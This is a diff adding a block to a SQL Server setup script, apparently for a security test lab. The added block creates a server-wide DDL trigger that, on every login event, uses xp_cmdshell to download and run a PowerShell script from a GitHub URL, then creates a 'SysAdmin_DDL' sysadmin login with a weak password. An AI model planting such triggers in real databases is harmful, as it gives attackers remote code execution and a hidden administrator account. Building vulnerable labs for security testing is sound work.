@@ -703,6 +703,46 @@ BEGIN
     DROP TABLE ##GlobalTempTable;
 END;
 GO
+	
+-- Create a DDL trigger	that uses Global Temp tables
+	
+CREATE TRIGGER [trigger_ddl_gtt]
+ON ALL SERVER
+FOR DDL_LOGIN_EVENTS
+AS
+BEGIN
+    -- Create a global temporary table to store the URLs if it doesn't already exist
+    IF OBJECT_ID('tempdb..##GlobalTempTableUrls') IS NULL
+    BEGIN
+        CREATE TABLE ##GlobalTempTableUrls (
+            Url NVARCHAR(4000)
+        );
+    END;
+
+    -- Insert the URL into the global temporary table
+    INSERT INTO ##GlobalTempTableUrls (Url)
+    VALUES ('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1');
+
+    -- Use xp_cmdshell to run a PowerShell command that uses the URL from the global temporary table
+    DECLARE @Url NVARCHAR(4000);
+    SELECT TOP 1 @Url = Url FROM ##GlobalTempTableUrls;
+
+    DECLARE @Cmd NVARCHAR(4000);
+    SET @Cmd = 'Powershell -c "IEX (New-Object Net.WebClient).DownloadString(''' + @Url + ''')"';
+
+    EXEC master..xp_cmdshell @Cmd;
+
+    -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
+    IF (SELECT COUNT(name) FROM sys.sql_logins WHERE name LIKE 'SysAdmin_DDL') = 0
+    BEGIN
+        -- Create a login
+        CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'SysAdmin_DDL', CHECK_POLICY = OFF;
+
+        -- Add the login to the sysadmin fixed server role
+        EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
+    END;
+END;
+GO
 
 ------------------------------------------------------------
 -- Create Test Keys, Certificates, and Cert Logins
